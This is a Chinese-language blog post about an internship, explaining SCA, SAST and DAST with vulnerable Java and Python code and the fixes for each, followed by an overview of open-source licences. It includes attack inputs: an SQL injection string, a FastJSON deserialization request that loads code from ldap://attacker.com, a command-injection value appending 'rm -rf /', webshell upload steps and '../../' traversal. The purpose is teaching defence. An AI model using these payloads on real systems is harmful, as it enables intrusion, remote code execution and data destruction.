---
title: Internship Experiences
date: 2026-07-07
tags: [安全测试, DevOps]
---

## SCA、SAST、DAST 是什么

| 缩写 | 全称 |
|------|------|
| SCA  | Software Composition Analysis（软件成分分析）               |
| SAST | Static Application Security Testing（静态应用程序安全测试）  |
| DAST | Dynamic Application Security Testing（动态应用程序安全测试） |

个人可以理解为：

- **SCA**：只检查每个组成部分（开源组件、第三方库文件），不检查代码漏洞和运行漏洞。

- **SAST**：根据源码判断设计缺陷漏洞，判断源代码中的可能漏洞，如：
    1. 注入式漏洞：SQL 注入、命令注入
    2. 跨站脚本 XSS：反射型 XSS、存储型 XSS、基于 DOM 的 XSS
    3. 加密与随机数问题：使用 MD5、SHA1 等弱哈希算法，使用不安全的随机数生成器
    4. 代码质量：如空指针、内存资源分配、日志泄露、错误信息泄露（API、密码）

- **DAST**：检测实际运行时出现的漏洞（黑盒测试无需源码），包含配置环境、API 认证问题。

## 三种安全测试方法对比

|        | SCA              | SAST                  | DAST                   |
|--------|------------------|-----------------------|------------------------|
| 全称   | Software Composition Analysis | Static Application Security Testing | Dynamic Application Security Testing |
| 测什么 | **第三方依赖**   | **自己的源代码**      | **运行中的应用**       |
| 什么时候 | 开发/构建阶段  | 编码/提交阶段         | 测试/上线后            |
| 类比   | 查原材料合格证   | 静态的时候检查        | 运行的时候测试         |

## 举个例子

项目引用了 `log4j 2.14.0`：

- **SCA** → 发现 `log4j 2.14.0` 有 CVE-2021-44228 漏洞，建议升级到 `2.17.0`

这是一个经典 Log4Shell 漏洞，其中 Apache Log4j 2.x 第三方组件存在漏洞，允许他人通过日志消息远程执行任意代码。这就是一个 **SCA** 检测。

我的代码里面写了：

```java
String query = "SELECT * FROM users WHERE name = '" + userName + "'";
```

这也是一个经典的 SQL 注入漏洞，如果我将 `userName` 设置为 `' OR '1'='1`，最终的 SQL 会变成：

```sql
SELECT * FROM users WHERE name = '' OR '1'='1';
```

这会返回所有用户信息！同理可以通过更改用户名成为 SQL 指令删除所有数据。这是 **SAST** 扫描效果。

- **SAST** → 建议用 PreparedStatement 预编译和参数化查询来解决，占位符分割结构与数据传入：

**修复前：**

```java
String query = "SELECT * FROM users WHERE name = '" + userName + "'";
Statement stmt = connection.createStatement();
ResultSet rs = stmt.executeQuery(query);
```

**修复后：**

```java
// 1. 使用 ? 作为占位符
String query = "SELECT * FROM users WHERE name = ?";
// 2. 使用预编译语句
PreparedStatement pstmt = connection.prepareStatement(query);
// 3. 通过 set 方法安全地绑定参数（类型和值分离）
pstmt.setString(1, userName);
// 4. 执行查询
ResultSet rs = pstmt.executeQuery();
```

应用部署到测试环境后：

- **DAST** → 发送恶意 payload 后发现 `/api/login` 返回了异常堆栈信息

通过发送一些特殊参数如 `'` 或 `%27`（URL 编码后的单引号），获得了完整的堆栈信息，其中存在特征字符串的堆栈可视为信息泄露漏洞。容易泄露技术栈、框架、包路径与类、数据库路径、SQL 表与字段相关内容如：

- 技术栈：比如 `java.lang.NullPointerException` 表明后端是 Java
- 框架/库信息：比如 `org.springframework.web.bind` 表明使用了 Spring 框架
- 包路径和类名：比如 `com.yourcompany.controller.LoginController`，暴露了代码的内部结构
- 数据库或文件路径：比如 `C:\app\data\` 或 `/var/www/`，暴露了服务器目录结构
- SQL 语句片段：如果异常是 SQL 相关的，可能直接暴露表名、字段名

可以通过统一异常处理，对外返回友好的错误信息，但不泄露任何内部细节的方式修复，使用 `@ControllerAdvice`：

```java
@ControllerAdvice
public class GlobalExceptionHandler {

    // 处理所有未捕获的异常
    @ExceptionHandler(Exception.class)
    @ResponseBody
    @ResponseStatus(HttpStatus.INTERNAL_SERVER_ERROR)
    public ErrorResponse handleAllExceptions(Exception ex) {
        // 关键：只记录详细的堆栈到日志，用于内部排查
        log.error("系统异常", ex);

        // 返回给客户端的只有一条通用的、不包含任何细节的消息
        return new ErrorResponse("系统处理异常，请稍后重试");
    }
}

// 统一的返回结构
public class ErrorResponse {
    private String message;
    // 构造函数、getter/setter...
}
```

## 如何实现

### SCA

扫描依赖清单（`package.json`、`pom.xml`、`build.gradle` 等），对比 CVE/NVD 漏洞数据库，报告已知漏洞并建议升级版本。

常用工具：**Snyk**、**OWASP Dependency-Check**、**Black Duck**

### SAST

解析源代码为 AST（抽象语法树），匹配危险模式，跟踪数据流，找出 SQL 注入、XSS、硬编码密码等问题。

常用工具：**SonarQube**、**Checkmarx**、**Semgrep**

### DAST

爬取运行中的网站，自动注入恶意 payload，根据响应判断是否存在漏洞。

常用工具：**OWASP ZAP**、**Burp Suite**、**Acunetix**

## 最后我一句话总结

> SCA  = 你用的第三方库有没有已知漏洞
> SAST = 你写的代码有没有安全缺陷（白盒，看源码）
> DAST = 你跑起来的应用能不能被攻破（黑盒，看行为）
>
> 三者互补，而非替代。

## 再来一些本人觉得有趣的例子

### SCA 案例：FastJSON 反序列化漏洞（CVE-2022-25845）

攻击者可以构造特殊的 JSON 数据，利用这个特性实例化任意类并调用其 setter/getter 方法，进而执行任意代码。相当于初始化了一个万能遥控器类，选择攻击者为控制者，设置允许为 `true`。因此需要注意敏感词条 `type`、`autoCommit` 等。

```http
POST /api/parse HTTP/1.1
Host: example.com
Content-Type: application/json

{
    "@type": "com.sun.rowset.JdbcRowSetImpl",
    "dataSourceName": "ldap://attacker.com/Exploit",
    "autoCommit": true
}
```

### SAST 案例：不安全的文件上传（Unrestricted File Upload）

攻击者可上传 Webshell，获得服务器控制权，可伪装成其他类型文件，从而运行其脚本。

如下是用户上传头像照片功能：

```java
@PostMapping("/upload")
public String uploadFile(@RequestParam("file") MultipartFile file, HttpServletRequest request) {
    // 获取上传目录
    String uploadPath = request.getServletContext().getRealPath("/uploads/");
    File uploadDir = new File(uploadPath);
    if (!uploadDir.exists()) {
        uploadDir.mkdirs();
    }

    // 使用原始文件名保存
    String originalFilename = file.getOriginalFilename();
    File destFile = new File(uploadPath + File.separator + originalFilename);

    // 保存文件
    file.transferTo(destFile);

    return "上传成功！";
}
```

此时若是上传一个 `shell.jsp` 文件，服务器保存至 `/uploads/shell.jsp` 路径下，然后访问 `https://example.com/uploads/shell.jsp` 执行代码，在 shell 中注入 `whoami` 指令即可获得用户信息。可用白名单文件、上传文件格式限制等操作维护。

### DAST 案例：目录遍历（Directory Traversal）

为下载指定文件功能：

```java
@GetMapping("/download")
public void downloadFile(@RequestParam String filename, HttpServletResponse response) throws IOException {
    // 文件保存在 /app/files/ 目录下
    String baseDir = "/app/files/";
    File file = new File(baseDir + filename);

    if (file.exists()) {
        // 设置响应头，输出文件
        response.setContentType("application/octet-stream");
        response.setHeader("Content-Disposition", "attachment; filename=" + filename);
        FileInputStream fis = new FileInputStream(file);
        IOUtils.copy(fis, response.getOutputStream());
        fis.close();
    } else {
        response.setStatus(HttpServletResponse.SC_NOT_FOUND);
    }
}
```

正常输入 `?filename=report.pdf`，即为正常下载 `report.pdf`。但若是使用 `../../` 即可回到父目录去访问敏感信息，如 `pwd`、`Info` 等。

### SAST 案例：命令注入（Command Injection）

📌 案例：Ping 功能导致的命令注入

```python
import os
from flask import Flask, request

app = Flask(__name__)

@app.route('/ping')
def ping():
    # 获取用户输入的 IP
    ip = request.args.get('ip', '127.0.0.1')

    # 危险！直接拼接命令
    command = f"ping -c 4 {ip}"
    result = os.popen(command).read()

    return f"<pre>{result}</pre>"

if __name__ == '__main__':
    app.run()
```

正常请求 `GET /ping?ip=8.8.8.8`。攻击请求 `GET /ping?ip=8.8.8.8; rm -rf /`，分解成两个指令，后者给你全删掉了。可以通过 `subprocess` 传递参数列表、严谨格式传递等方式解决。

## 开源许可证（License）
开源许可证本质上是一份具有法律效力的授权协议。它弥补了版权法"默认禁止共享"的缺口——没有许可证的开源代码，用户只能看不能用，一用就可能侵权。所有开源许可证都允许免费使用、修改和分发代码，但它们附加的条件不同。因此约莫可以分为两类：

### 宽松型许可证（Permissive）
这类许可证限制最少，商业友好。你可以自由使用、修改代码，甚至将其整合进自己的闭源商业软件中销售，唯一强制的义务是保留原作者的版权声明。

- **MIT**：最简单、限制最少，只要求保留版权声明，是目前最流行的许可证之一（如 React、Vue、Node.js）。
- **Apache 2.0**：与 MIT 类似，但增加了明确的专利授权条款，使用更放心（如 Kubernetes、TensorFlow）。
- **BSD**：与 MIT 相似，其 3-Clause 版本额外禁止用原作者名义做推广（如 Go 语言、FreeBSD）。

其中Apache这个名词让我想到了在搜集SCA时候遇到的漏洞，历史上著名的“Apache Struts2 远程代码执行漏洞”（如S2-045），就是指Apache基金会下的Struts2这个Web框架存在严重漏洞。我之前提到的的Log4j漏洞（CVE-2021-44228），Log4j也是Apache基金会的顶级项目，因此也被称为“Apache Log4j漏洞”。

### Copyleft 型许可证（著佐权）

这类许可证更注重"自由"的传递，带有 "传染性" 。它要求任何基于该许可证代码修改或衍生的软件，在分发时必须同样开源，使用相同许可证。

- **GPL**：最著名的 Copyleft 许可证。只要项目包含了 GPL 代码，整个项目在分发时都必须开源，Linux 内核为经典案例。
- **AGPL**：GPL 的"网络版"。它堵住了"云服务（SaaS）不构成分发"的漏洞，规定如果用 AGPL 代码提供网络服务，代码也必须对用户开源。
- **LGPL**：专为类库设计的"弱 Copyleft"许可证。允许商业软件通过动态链接调用它的库，而无需开源自身。
- **MPL**：文件级别的 Copyleft。修改过的 MPL 文件必须开源，但新增的其他文件可以闭源（如 Firefox）。

另外，开源软件许可证通常不适用于文档、图片等非代码作品，这类作品开源应使用知识共享许可证（Creative Commons，简称CC许可证）。
因此在个人简单使用的时候，为保证个人项目闭源，可采用Permissive中的几种License，若有专利保护需求Apach合适。个人项目防止他人闭源商用即可使用GPL AGPL方式的许可证。